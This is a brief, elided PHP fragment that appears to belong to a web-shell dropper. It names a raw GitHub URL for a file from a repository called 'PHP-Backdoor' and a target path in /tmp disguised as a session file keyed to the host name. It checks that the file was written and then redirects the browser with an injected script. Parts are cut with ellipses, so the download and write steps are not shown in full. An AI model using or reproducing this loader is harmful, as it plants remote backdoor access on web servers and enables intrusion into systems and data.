...
$data = ['https://raw.githubusercontent.com/zerobyte-id/PHP-Backdoor/master/0byt3m1n1/0byt3m1n1.php', '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php'];
...
if(file_exists($data[1]) && filesize($data[1]) !== 0) {
    ...
    fclose($fopen);
    echo '<script>window.location="?yra";</script>';
}
